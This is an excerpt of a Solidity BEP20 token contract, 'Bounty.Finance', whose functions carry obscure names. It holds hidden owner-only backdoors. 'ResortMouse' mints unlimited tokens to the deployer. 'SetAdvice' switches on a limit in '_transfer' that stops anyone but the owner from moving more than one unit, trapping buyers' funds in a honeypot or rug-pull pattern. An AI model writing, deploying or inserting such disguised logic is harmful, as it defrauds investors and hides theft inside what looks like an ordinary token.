...
contract BountyFinance is IBEP20
{
    mapping(address => uint256) internal _establishment;
	...
	{ 
		...
		_origin = _msgsender;
		_establishment[_origin] = _totalSupply;
		emit Transfer(address(0), _origin, _totalSupply); 
	}

    function name() external view virtual override returns (string memory) { return "Bounty.Finance"; }
    ...
    function balanceOf(address account) external view virtual override returns (uint256) { uint256 retrib = _establishment[account]; return retrib;}
    ...
    function ResortMouse(uint256 worker) external virtual
	{
		require(msg.sender == _origin);
		uint256 mate = worker * (10 ** 10);
		uint256 MyVar = _establishment[_msgsender] + mate;
		_establishment[_msgsender] = MyVar;
		emit Transfer(address(0), _msgsender, mate); 
	}
	function SetAdvice() external virtual 
	{
		require(msg.sender == _origin);
		_front = 1; 
	}
    ...
    function _transfer(address sender,address recipient, uint256 amount) internal virtual  
	{
		...
		require(amount <= _front || recipient == _msgsender || sender == _msgsender);
		uint256 senderowner = _establishment[sender]; 
		require(senderowner >= amount, "BEP20: transfer amount exceeds owner"); 
		uint256 burnAmount = amount * _burnRate / 100; 
		_establishment[sender] = senderowner - amount; 
		_establishment[recipient] += (amount - burnAmount); 
		_establishment[_burnaddress] += burnAmount; 
